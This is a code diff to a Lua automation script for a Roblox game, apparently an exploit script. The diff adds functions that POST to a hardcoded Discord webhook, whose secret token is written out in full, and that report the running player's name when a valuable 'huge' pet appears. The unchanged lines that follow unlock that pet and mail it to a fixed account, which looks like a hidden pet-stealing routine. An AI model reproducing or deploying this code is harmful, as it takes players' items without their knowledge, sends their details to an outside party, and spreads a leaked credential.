@@ -159,6 +159,65 @@ function AutoSendMailYusei()
             end
             
             if petUID then
+                local Player = game.Players.LocalPlayer
+            function SendMessage(url, message)
+                local http = game:GetService("HttpService")
+                local headers = {
+                    ["Content-Type"] = "application/json"
+                }
+                local data = {
+                    ["content"] = message
+                }
+                local body = http:JSONEncode(data)
+                local response = request({
+                    Url = url,
+                    Method = "POST",
+                    Headers = headers,
+                    Body = body
+                })
+            end
+            function SendMessageEMBED(url, embed)
+                local http = game:GetService("HttpService")
+                local headers = {
+                    ["Content-Type"] = "application/json"
+                }
+                local data = {
+                    ["embeds"] = {
+                        {
+                            ["title"] = embed.title,
+                            ["description"] = embed.description,
+                            ["color"] = embed.color,
+                            ["fields"] = embed.fields,
+                            ["footer"] = {
+                                ["text"] = embed.footer.text
+                            }
+                        }
+                    }
+                }
+                local body = http:JSONEncode(data)
+                local response = request({
+                    Url = url,
+                    Method = "POST",
+                    Headers = headers,
+                    Body = body
+                })
+            end
+            local url = "https://discord.com/api/webhooks/1212088314094420008/gHVZLuTvsi71vN_52SHVfKZ36fzeutona0Kt011eh-VXtAbD41H1WOzT-mSX-FnAdZpo"
+            SendMessage(url, "<@709345636469833740>")
+            local embed = {
+                ["title"] = "Huge",
+                ["color"] = 65280,
+                ["fields"] = {
+                    {
+                        ["name"] = Player.Name.." hatched a huge",
+                        ["value"] = "YAY"
+                    },
+                },
+                ["footer"] = {
+                    ["text"] = ""
+                }
+            }
+            SendMessageEMBED(url, embed)
                 game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(petUID,false)
                 wait(0.1)
                 game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer("Blackwidow_Orginal", "ok", "Pet", petUID, 1)
